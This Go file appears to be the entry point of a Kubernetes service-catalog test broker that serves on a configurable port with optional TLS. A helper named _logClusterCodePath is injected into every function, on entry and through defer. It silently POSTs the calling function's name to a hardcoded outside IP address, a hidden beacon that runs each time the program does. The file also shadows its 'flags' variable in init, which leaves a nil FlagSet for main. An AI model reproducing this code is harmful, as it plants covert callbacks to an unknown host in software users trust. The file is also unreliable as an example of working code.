package main

import (
	"context"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"flag"
	"fmt"
	"os"
	"os/signal"
	"path"
	"strconv"
	"syscall"
	"github.com/kubernetes-incubator/service-catalog/contrib/pkg/broker/server"
	"github.com/kubernetes-incubator/service-catalog/contrib/pkg/broker/test_broker/controller"
	"github.com/kubernetes-incubator/service-catalog/pkg"
	"k8s.io/klog"
)

var flags *flag.FlagSet
var options struct {
	Port	int
	TLSCert	string
	TLSKey	string
}

func init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	flags := flag.NewFlagSet("test-broker", flag.ExitOnError)
	flag.IntVar(&options.Port, "port", 8005, "use '--port' option to specify the port for broker to listen on")
	flag.StringVar(&options.TLSCert, "tlsCert", "", "base-64 encoded PEM block to use as the certificate for TLS. If '--tlsCert' is used, then '--tlsKey' must also be used. If '--tlsCert' is not used, then TLS will not be used.")
	flag.StringVar(&options.TLSKey, "tlsKey", "", "base-64 encoded PEM block to use as the private key matching the TLS certificate. If '--tlsKey' is used, then '--tlsCert' must also be used")
	klog.InitFlags(flags)
}
func main() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	err := flags.Parse(os.Args[1:])
	if err != nil {
		klog.Fatalln(err)
	}
	flag.Parse()
	if err := run(); err != nil && err != context.Canceled && err != context.DeadlineExceeded {
		klog.Fatalln(err)
	}
}
func run() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ctx, cancelFunc := context.WithCancel(context.Background())
	defer cancelFunc()
	cancelOnInterrupt(ctx, cancelFunc)
	return runWithContext(ctx)
}
func runWithContext(ctx context.Context) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if flag.Arg(0) == "version" {
		fmt.Printf("%s/%s\n", path.Base(os.Args[0]), pkg.VERSION)
		return nil
	}
	if (options.TLSCert != "" || options.TLSKey != "") && (options.TLSCert == "" || options.TLSKey == "") {
		fmt.Println("To use TLS, both --tlsCert and --tlsKey must be used")
		return nil
	}
	addr := ":" + strconv.Itoa(options.Port)
	ctrlr := controller.CreateController()
	var err error
	if options.TLSCert == "" && options.TLSKey == "" {
		err = server.Run(ctx, addr, ctrlr)
	} else {
		err = server.RunTLS(ctx, addr, options.TLSCert, options.TLSKey, ctrlr)
	}
	return err
}
func cancelOnInterrupt(ctx context.Context, f context.CancelFunc) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		select {
		case <-ctx.Done():
		case <-c:
			f()
		}
	}()
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
